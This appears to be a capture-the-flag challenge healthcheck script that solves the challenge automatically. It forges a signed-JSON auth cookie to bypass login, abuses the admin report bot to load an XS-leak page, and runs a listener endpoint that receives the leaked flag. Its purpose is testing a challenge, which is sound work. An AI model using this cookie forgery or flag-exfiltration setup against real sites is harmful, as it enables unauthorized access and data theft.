#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests, urllib, json, os, time, urllib
from fastapi.responses import HTMLResponse
from fastapi.middleware.cors import CORSMiddleware
from uvicorn import Server, Config
from fastapi import FastAPI
from contextlib import asynccontextmanager, contextmanager
from threading import Thread
from time import sleep

CHALLENGE_URL = os.environ["CHALLENGE_URL"]
SOLVE_STATUS = False
PORT = os.environ["PORT"]

def login_bypass(url):
    session = requests.Session()
    login = {"username": "healthcheck", "password": "healthcheck"}
    session.post(url, data=login, allow_redirects=True)

    # get cookie
    cookies = requests.utils.dict_from_cookiejar(session.cookies)
    auth = urllib.parse.unquote(json.loads(json.dumps(cookies))["auth"])

    # login bypass
    cookie_bypass = "j:" + auth[:-1] + ',"allowed":true}'
    id = json.loads(auth)["id"]
    cookie = {"auth": cookie_bypass}
    r = requests.get(url + f"/dashboard/{id}", cookies=cookie)

    if "Hello healthcheck<br>Welcome to my website" not in r.text:
        return False
    else:
        return cookie


def xsleak(url, cookie):
    r = requests.get(
        f"{url}/report?url=http://healthcheck:{PORT}/exploit", cookies=cookie
    )
    if "admin visited healthcheck exploit" in r.text:
        return True


@asynccontextmanager
async def lifespan(_: FastAPI):
    xsleak(CHALLENGE_URL, login_bypass(CHALLENGE_URL))
    yield


app = FastAPI(lifespan=lifespan)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_headers=["*"],
    allow_methods=["*"],
    allow_credentials=True,
)


@app.get("/exploit", response_class=HTMLResponse)
async def exploit():
    with open("/home/user/healthcheck_exploit.html") as f:
        ex = f.read()
    return ex


@app.get("/")
async def exfil(flag: str) -> str:
    global SOLVE_STATUS
    SOLVE_STATUS = "cr3{c" in flag
    return "ok"


class Server(Server):
    def install_signal_handlers(self):
        pass

    @contextmanager
    def run_in_thread(self):
        thread = Thread(target=self.run)
        thread.start()
        try:
            while not self.started:
                sleep(1e-3)
            yield
        finally:
            self.should_exit = True
            thread.join()


if __name__ == "__main__":
    time.sleep(3)
    config = Config(app, host="0.0.0.0", port=int(PORT))
    server = Server(config=config)
    with server.run_in_thread():
        while not SOLVE_STATUS:
            sleep(0.3)
    exit(0)
